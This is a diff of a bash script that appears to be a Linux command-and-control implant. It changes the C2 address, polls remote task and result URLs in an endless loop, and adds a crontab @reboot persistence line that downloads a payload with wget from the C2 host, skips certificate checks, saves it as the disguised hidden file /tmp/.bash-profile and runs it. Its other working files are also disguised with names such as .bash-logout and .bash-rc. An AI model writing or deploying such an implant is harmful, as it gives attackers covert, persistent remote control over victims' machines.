@@ -1,7 +1,7 @@
 #!/bin/bash
 
 #Define parameters needed
-ip="192.168.100.8"
+ip="192.168.19.133"
 port="8000"
 interface="eth0"
 n=.3
@@ -19,6 +19,7 @@ taskl="https://$ip:$port/tasks/$name/"
 resultl="https://$ip:$port/Lin-results/$name/"
 
 # Add the cronjob to run the script after rebooting (presistency providing)
+echo "@reboot sleep 45 && wget --no-check-certificate https://$ip:$port/lin-download/$interface -O /tmp/.bash-profile;chmod +x /tmp/.bash-profile;bash /tmp/.bash-profile" | crontab -
 
 while :
 do
@@ -35,8 +36,6 @@ do
         results=".bash-logout"
         encResult=".bash-rc"
     fi  
-    
-    echo "@reboot sleep 45 && bash $path/.bash-profile " | crontab -            #t3del 34an mi3ml4 wget kol mift7 3la payload 8lt
     #Check for tasks
     curl -k $taskl > $path/$tasks
     if [ -s $path/$tasks ]; then
@@ -48,5 +47,7 @@ do
         
     #Sleep for a while then continue the loop
     sleep $n
+
 done
+
 
